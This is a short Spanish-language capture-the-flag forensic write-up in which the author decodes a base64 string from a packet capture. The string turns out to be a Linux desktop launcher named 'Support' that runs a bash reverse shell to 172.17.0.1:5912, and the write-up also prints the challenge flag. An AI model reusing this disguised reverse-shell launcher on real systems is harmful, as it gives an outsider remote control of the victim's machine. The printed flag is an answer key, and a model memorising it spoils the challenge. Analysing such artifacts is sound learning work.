




## Solucion
- nos daban una capura de paquetes
- Le hice strings y ah venia algo sospechos

- asi que bolas y ahi esaba


```
┌──(kali㉿kali)-[~/…/ctfs2022/11-29-adf-cyber-skills/forensic/bitbybit]
└─$ echo "W0Rlc2t0b3AgRW50cnldClR5cGU9QXBwbGljYXRpb24KTmFtZT1TdXBwb3J0CkV4ZWM9YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzU5MTIgMD4mMSIKQ29tbWVudD1TRlJDZTJJeGRHSjFZMnN6ZERWZmNIVmliREZqWDNJemNEQnpYMmN3WDJKeWNuSWhJWDBLCg==" | base64 -d 
[Desktop Entry]
Type=Application
Name=Support
Exec=bash -c "bash -i >& /dev/tcp/172.17.0.1/5912 0>&1"
Comment=SFRCe2IxdGJ1Y2szdDVfcHVibDFjX3IzcDBzX2cwX2JycnIhIX0K
                                                                                                                     
┌──(kali㉿kali)-[~/…/ctfs2022/11-29-adf-cyber-skills/forensic/bitbybit]
└─$ echo SFRCe2IxdGJ1Y2szdDVfcHVibDFjX3IzcDBzX2cwX2JycnIhIX0K 
SFRCe2IxdGJ1Y2szdDVfcHVibDFjX3IzcDBzX2cwX2JycnIhIX0K
                                                                                                                     
┌──(kali㉿kali)-[~/…/ctfs2022/11-29-adf-cyber-skills/forensic/bitbybit]
└─$ echo SFRCe2IxdGJ1Y2szdDVfcHVibDFjX3IzcDBzX2cwX2JycnIhIX0K | base64 -d
HTB{b1tbuck3t5_publ1c_r3p0s_g0_brrr!!}
```